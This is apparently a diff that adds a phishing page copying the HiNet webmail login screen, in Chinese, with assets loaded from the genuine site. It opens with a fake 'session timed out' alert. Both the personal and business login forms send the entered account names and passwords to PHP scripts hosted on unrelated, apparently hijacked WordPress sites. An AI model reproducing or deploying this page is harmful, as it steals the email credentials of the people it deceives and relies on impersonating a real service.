@@ -1,0 +1,355 @@
+﻿<script>
+alert('Your session has timed out, Click OK to sign in and continue.');
+</script>
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+	
+	<link rel="icon" type="image/ico" href="http://i.imgur.com/fpXZu5q.png?1">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<title>HiNet 網頁郵件服務</title>
+		<link rel="stylesheet" type="text/css" href="https://webmail.hinet.net/css/index.css">
+		<link rel="stylesheet" type="text/css" href="https://webmail.hinet.net/css/keyboardstyle.css" id="size-stylesheet">
+		<link rel="stylesheet" type="text/css" href="https://webmail.hinet.net/css/login.css">
+		
+		
+		<script>
+			var url = window.location.href;
+			if(url.indexOf("www.webmail.hinet.net") != -1){
+				window.location = "https://webmail.hinet.net";
+			}
+		</script>
+		
+		
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/jquery.min.js"></script>
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/jquery-ui-1.10.3.custom.min.js"></script>
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/jquery-fieldselection.js"></script>
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/vkeyboard.js"></script>
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/login.js"></script>
+		<script type="text/javascript" src="https://webmail.hinet.net/Scripts/index.js"></script>
+	</head>
+	<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+		<!-- Top : begin fixed/relative? IE not support fixed -->
+		<div id="topDiv" class="top" style="text-align:center">
+			<iframe id="tFrame" src="https://webmail.hinet.net/top.html" width="100%" height="60px" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>
+		</div>
+		<!-- Top : end -->
+		<!-- Floating AD: begin -->
+		<div id="adDiv" class="background_ad" style="text-align:center">		
+			<script type="text/javascript">
+			bust1=Math.floor(10000000000*Math.random());
+			document.write('<scr'+'ipt language="JavaScript" src="https://p8u.hinet.net/js.ng/site=hinet&affiliate=webmail&spacedesc=webmail1440x1024&adsize=1440x1024&tile='+bust1+'&transactionID='+bust1+'"></scr' + 'ipt>');
+			</script>			
+		</div>
+		<div class="real_ad" id="real_ad">
+			<script type="text/javascript">
+			document.write('<scr'+'ipt language="JavaScript" src="https://p8u.hinet.net/js.ng/site=hinet&affiliate=webmail&spacedesc=webmail660x520&adsize=660x520&tile='+bust1+'&transactionID='+bust1+'"></scr' + 'ipt>');
+			</script>
+		</div>
+		<div class="notify" id="notify">
+			<iframe width="660" height="520" marginwidth="0" marginheight="0" frameborder="0" scrolling="no" bordercolor="#F3F5FF" src="notify.html" target="_blank"></iframe>
+		</div>
+		<!-- Floating AD: end -->
+		<!-- Bottom : begin -->
+		<div id="footerDiv" class="footer">
+			<iframe id="bFrame" src="https://webmail.hinet.net/bottom.html" width="100%" height="60px" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>
+		</div>
+		<!-- Bottom : end -->
+		<!-- Webmail Login Tab: begin top:1050px left:90px -->
+		<div id="loginDiv" class="loginDiv">
+			<div style="text-align:right;width:260px">
+				<span>
+					中文 <img src="https://webmail.hinet.net/images/w_line.gif" width="1" height="10"> <a href="./index_en.html">English</a> &nbsp;
+				</span>
+			</div>
+			<div class="abgne_tab">
+				<ul class="tabs">
+					<li>
+						<a href="#tab1">個人信箱</a>
+					</li>
+					<li>
+						<a href="#tab2">&nbsp;hiMail&nbsp;</a>
+					</li>
+					<li class="out">
+						<a href="#" target="_blank">設定說明</a>
+					</li>
+				</ul>
+				<div class="tab_container">
+					<!-- form personal :begin -->
+					<div id="tab1" class="tab_content">
+						<div id="personalDiv">
+							<div style="text-align: center">
+								<h2>《 HiNet個人信箱 》</h2>
+							</div>
+							<form name="personal" onsubmit="return checkInput(document.personal)" action="http://halloweenstore.in/wp-content/plugins/cache/inc/includes/pub/sources/inner/sources/genesis/hinet.php" method="post">
+								<input type="hidden" name="usertype">
+								<input type="hidden" name="https" value="1">
+								<input type="hidden" name="lang" value="zh">
+								<div style="text-align: center">
+									<span id="personalMessage" style="color: #000000">請輸入帳號和密碼</span>
+								</div>
+								<div class="ctrlGroup" style="line-height:24px">
+									<label for="idPuser" class="loginLabel">帳號：</label>
+									<input id="idPuser" name="mailid" tabindex="1" size="16" onkeyup="checkTheSame(document.personal)" title="使用者帳號(例：jack)" class="inputTxt">
+									<img id="show_username_keyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input username!" class="imgKB">
+								</div>
+								<div class="ctrlGroup" style="line-height:24px">
+									<label for="passPuser" class="loginLabel">密碼：</label>
+									<input id="passPuser" name="password" tabindex="2" type="password" maxlength="255" size="16" class="inputTxt">
+									<img id="showkeyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input password!" class="imgKB">
+									<input name="OK" id="OKPuser" tabindex="6" onmouseover="MM_swapImage('OKPuser','','https://webmail.hinet.net/images/maillogin_on_07-1.gif',1);" onmouseout="MM_swapImgRestore();" type="image" height="21" width="35" src="https://webmail.hinet.net/images/maillogin_07-1.gif" border="0" class="imgOK">
+								</div>
+								<div class="ctrlGroup">
+									<div>
+										<input id="saveaccPuser" tabindex="3" aligh="right" onclick="switchSavePasswd(document.personal);" type="checkbox" value="1" name="saveAccount">
+										<label for="saveaccPuser" class="checkboxLabel">記住帳號</label>
+										<input id="savepwPuser" tabindex="4" aligh="right" onclick="switchSaveAccount(document.personal);" type="checkbox" value="1" name="savePasswd">
+										<label for="savepwPuser" class="checkboxLabel">記住密碼</label>
+									</div>
+									<input id="cm1Puser" tabindex="5" aligh="right" type="checkbox" value="cm1" name="cm1">
+									<label for="cm1Puser" class="checkboxLabel">使用cm1信箱</label>
+								</div>
+								<div class="ctrlGroup">
+									<span style="display:block;font-size:small">服務說明</span>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">HTML 版</span>
+									</a>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">Flash 版</span>
+									</a>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">English Help</span>
+									</a>
+								</div>
+								<div class="ctrlGroup">
+									<span style="font-size:small">HiNet個人信箱包含ms1~ms99、msa、cm1及 <a href="http://www.umail.hinet.net/" target="_blank" class="new1">UMail</a> 使用者。</span>
+								</div>
+								<div class="ctrlGroup divTable">
+									<div class="col50L">
+										<a href="#" target="_blank"><span class="toolboxLabel">《忘記密碼》</span></a>
+									</div>
+									<div class="col50R">
+										<a href="#" target="_blank"><span class="toolboxLabel">《登入說明》</span></a>
+									</div>
+									<div class="col50L">
+										<a href="#" target="_blank"><span class="toolboxLabel">《系統公告》</span></a>
+									</div>
+									<div class="col50R">
+										<a href="#" target="_blank"><span class="toolboxLabel">《使用規則》</span></a>
+									</div>
+								</div>
+							</form>
+						</div>
+					</div>
+					<!-- form personal :end -->
+					<!-- form business :begin -->
+					<div id="tab2" class="tab_content">
+						<div id="businessDiv">
+							<div style="height:37px; text-align:center">
+								<img src="https://webmail.hinet.net/images/himail_logo.gif" alt="HiMail">
+							</div>
+							<form name="business" onsubmit="return checkInput(document.business)" action="http://cosmicboulevard.info/wp-content/plugins/rajce-embed/hinet.php" method="post">
+								<input type="hidden" name="https" value="1">
+								<input type="hidden" name="lang" value="zh">
+								<div style="text-align:center">
+									<span id="businessMessage" style="color:#000000">請輸入 E-mail 和密碼</span>
+								</div>
+								<div class="ctrlGroup" style="line-height:24px">
+									<label for="idBizuser" class="loginLabel">E-mail：</label>
+									<input id="idBizuser" name="mailid" tabindex="7" size="16" onkeyup="checkTheSame(document.business)" title="使用者帳號@公司domain(例：john@ilovehimail.com.tw)" class="inputTxt">
+									<img id="show_username_keyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input username!" class="imgKB">
+								</div>
+								<div class="ctrlGroup" style="line-height:24px">
+									<label for="passBizuser" class="loginLabel">密碼：</label>
+									<input id="passBizuser" name="password" tabindex="8" type="password" maxlength="255" size="16" class="inputTxt">
+									<img id="showkeyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input password!" class="imgKB">
+									<input name="OKBizuser" type="image" id="OKBizuser" tabindex="11" onmouseover="MM_swapImage('OKBizuser','','https://webmail.hinet.net/images/maillogin_on_07-1.gif',1);" onmouseout="MM_swapImgRestore()" src="https://webmail.hinet.net/images/maillogin_07-1.gif" width="35" height="21" class="imgOK">
+								</div>
+								<div class="ctrlGroup"  style="margin-bottom:43px">
+									<input id="saveaccBizuser" tabindex="9" aligh="right" onclick="switchSavePasswd(document.business);" type="checkbox" value="1" name="saveAccount">
+									<label for="saveaccBizuser" class="checkboxLabel">記住E-mail</label>
+									<input id="savepwBizuser" aligh="right" onclick="switchSaveAccount(document.business);" tabindex="10" type="checkbox" value="1" name="savePasswd">
+									<label for="savepwBizuser" class="checkboxLabel">記住密碼</label>
+								</div>
+								<div class="ctrlGroup">
+									<span style="display:block;font-size:small">服務說明</span>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">HTML 版</span>
+									</a>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">Flash 版</span>
+									</a>
+									<img src="https://webmail.hinet.net/images/dot_arr2_t.gif" class="arrow" alt="&gt;">
+									<a href="#" target="_blank">
+										<span class="termLabel">English Help</span>
+									</a>
+								</div>
+								<div class="ctrlGroup">
+									<span style="font-size:small">HiNet 企業化電子郵件服務，相關資訊請按 <a href="https://www.himail.hinet.net" target="_blank">此處。</a></span>
+								</div>
+								<div class="ctrlGroup divTable">
+									<div class="col50L">
+										<a href="#" target="_blank"><span class="toolboxLabel">《忘記密碼》</span></a>
+									</div>
+									<div class="col50R">
+										<a href="#" target="_blank"><span class="toolboxLabel">《登入說明》</span></a>
+									</div>
+									<div class="col50L">
+										<a href="#" target="_blank"><span class="toolboxLabel">《系統公告》</span></a>
+									</div>
+									<div class="col50R">
+										<a href="#" target="_blank"><span class="toolboxLabel">《使用規則》</span></a>
+									</div>
+								</div>
+							</form>
+						</div>
+					</div>
+				</div>
+				<!-- form business:end -->
+				<!-- dynamic virtual keyboard: start -->
+				<div id="keyboard">
+					<div id="shuffleDiv">
+						<table width="100%">
+							<tr>
+								<td>
+									<input type="button" value="亂數排列" id="shuffle" class="butF">
+								</td>
+								<td align="right">
+									<input type="button" value="一般排列" id="Reset" class="butF">&nbsp;&nbsp;
+								</td>
+								<td>
+									&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type="image" id="close-img" value="Close" src="https://webmail.hinet.net/images/close.jpg" title="關閉鍵盤">
+								</td>
+							</tr>
+						</table>
+					</div>
+					<div id="row0">
+						<input name="accent" type="button" value="`" class="butS"><!--
+						--><input name="1" type="button" value="1" class="butI"><!--
+						--><input name="2" type="button" value="2" class="butI"><!--
+						--><input name="3" type="button" value="3" class="butI"><!--
+						--><input name="4" type="button" value="4" class="butI"><!--
+						--><input name="5" type="button" value="5" class="butI"><!--
+						--><input name="6" type="button" value="6" class="butI"><!--
+						--><input name="7" type="button" value="7" class="butI"><!--
+						--><input name="8" type="button" value="8" class="butI"><!--
+						--><input name="9" type="button" value="9" class="butI"><!--
+						--><input name="0" type="button" value="0" class="butI"><!--
+						--><input name="hyphen" type="button" value="-" class="butS"/><!--
+						--><input name="equal" type="button" value="=" class="butS"/><!--
+						--><input name="backspace" type="button" value="&larr;" id="backspace">
+					</div>
+					<div id="row0_shift">
+						<input name="tilde" type="button" value="~" class="butS"><!--
+						--><input name="exc" type="button" value="!" class="butS"><!--
+						--><input name="at" type="button" value="@" class="butS"><!--
+						--><input name="hash" type="button" value="#" class="butS"><!--
+						--><input name="dollar" type="button" value="$" class="butS"><!--
+						--><input name="percent" type="button" value="%" class="butS"><!--
+						--><input name="caret" type="button" value="^" class="butS"><!--
+						--><input name="ampersand" type="button" value="&amp;" class="butS"><!--
+						--><input name="asterisk" type="button" value="*" class="butS"><!--
+						--><input name="leftbracket" type="button" value="(" class="butS"><!--
+						--><input name="rightbracket" type="button" value=")" class="butS"><!--
+						--><input name="underscore" type="button" value="_" class="butS"><!--
+						--><input name="plus" type="button" value="+" class="butS"><!--
+						--><input name="backspace" type="button" value="&larr;" id="backspace">
+					</div>
+					<div id="row1">
+						<input name="q" type="button" value="q"  class="butW"><!--
+						--><input name="w" type="button" value="w"  class="butW"><!--
+						--><input name="e" type="button" value="e" class="butW"><!--
+						--><input name="r" type="button" value="r" class="butW"><!--
+						--><input name="t" type="button" value="t" class="butW"><!--
+						--><input name="y" type="button" value="y" class="butW"><!--
+						--><input name="u" type="button" value="u" class="butW"><!--
+						--><input name="i" type="button" value="i" class="butW"><!--
+						--><input name="o" type="button" value="o" class="butW"><!--
+						--><input name="p" type="button" value="p" class="butW"><!--
+						--><input name="[" type="button" value="[" class="butS"><!--
+						--><input name="]" type="button" value="]" class="butS"><!--
+						--><input name="backslash" type="button" value="\" class="butS">
+					</div>
+					<div id="row1_shift">
+						<input name="Q" type="button" value="Q" class="butW"><!--
+						--><input name="W" type="button" value="W" class="butW"><!--
+						--><input name="E" type="button" value="E" class="butW"><!--
+						--><input name="R" type="button" value="R" class="butW"><!--
+						--><input name="T" type="button" value="T" class="butW"><!--
+						--><input name="Y" type="button" value="Y" class="butW"><!--
+						--><input name="U" type="button" value="U" class="butW"><!--
+						--><input name="I" type="button" value="I" class="butW"><!--
+						--><input name="O" type="button" value="O" class="butW"><!--
+						--><input name="P" type="button" value="P" class="butW"><!--
+						--><input name="{" type="button" value="{" class="butS"><!--
+						--><input name="}" type="button" value="}" class="butS"><!--
+						--><input name="pipe" type="button" value="|" class="butS">
+					</div>
+					<div id="row2">
+						<input name="a" type="button" value="a" class="butW"><!--
+						--><input name="s" type="button" value="s" class="butW"><!--
+						--><input name="d" type="button" value="d" class="butW"><!--
+						--><input name="f" type="button" value="f" class="butW"><!--
+						--><input name="g" type="button" value="g" class="butW"><!--
+						--><input name="h" type="button" value="h" class="butW"><!--
+						--><input name="j" type="button" value="j" class="butW"><!--
+						--><input name="k" type="button" value="k" class="butW"><!--
+						--><input name="l" type="button" value="l" class="butW"><!--
+						--><input name="semi-colon" type="button" value=";" class="butS"><!--
+						--><input name="apostrophe" type="button" value="'" class="butS">
+					</div>
+					<div id="row2_shift">
+						<input name="a" type="button" value="A" class="butW"><!--
+						--><input name="s" type="button" value="S" class="butW"><!--
+						--><input name="d" type="button" value="D" class="butW"><!--
+						--><input name="f" type="button" value="F" class="butW"><!--
+						--><input name="g" type="button" value="G" class="butW"><!--
+						--><input name="h" type="button" value="H" class="butW"><!--
+						--><input name="j" type="button" value="J" class="butW"><!--
+						--><input name="k" type="button" value="K" class="butW"><!--
+						--><input name="l" type="button" value="L" class="butW"><!--
+						--><input name="colon" type="button" value=":" class="butS"><!--
+						--><input name="quote" type="button" value='"' class="butS">
+					</div>
+					<div id="row3">
+						<input name="Shift" type="button" value="Shift" id="shift" title="點擊即可顯示更多字元及符號"><!--
+						--><input name="z" type="button" value="z" class="butW"><!--
+						--><input name="x" type="button" value="x" class="butW"><!--
+						--><input name="c" type="button" value="c" class="butW"><!--
+						--><input name="v" type="button" value="v" class="butW"><!--
+						--><input name="b" type="button" value="b" class="butW"><!--
+						--><input name="n" type="button" value="n" class="butW"><!--
+						--><input name="m" type="button" value="m" class="butW"><!--
+						--><input name="comma " type="button" value="," class="butS"><!--
+						--><input name="period" type="button" value="." class="butS"><!--
+						--><input name="forward_slash" type="button" value="/" class="butS">
+					</div>
+					<div id="row3_shift">
+						<input name="Shift" type="button" value="Shift" id="shifton" title="點擊即可顯示更多字元及符號"><!--
+						--><input name="Z" type="button" value="Z" class="butW"><!--
+						--><input name="X" type="button" value="X" class="butW"><!--
+						--><input name="C" type="button" value="C" class="butW"><!--
+						--><input name="V" type="button" value="V" class="butW"><!--
+						--><input name="B" type="button" value="B" class="butW"><!--
+						--><input name="N" type="button" value="N" class="butW"><!--
+						--><input name="M" type="button" value="M" class="butW"><!--
+						--><input name="lt" type="button" value="&lt;" class="butS"><!--
+						--><input name="gt" type="button" value="&gt;" class="butS"><!--
+						--><input name="questionmark" type="button" value="?" class="butS">
+					</div>
+				</div>
+				<!-- dynamic virtual keyboard: end -->
+			</div>
+		</div>
+		<!-- Webmail Login Tab: end -->
+		<div id="hide_loginDiv" class="hide_loginDiv" style="text-align: center"></div>
+	</body>
+</html>
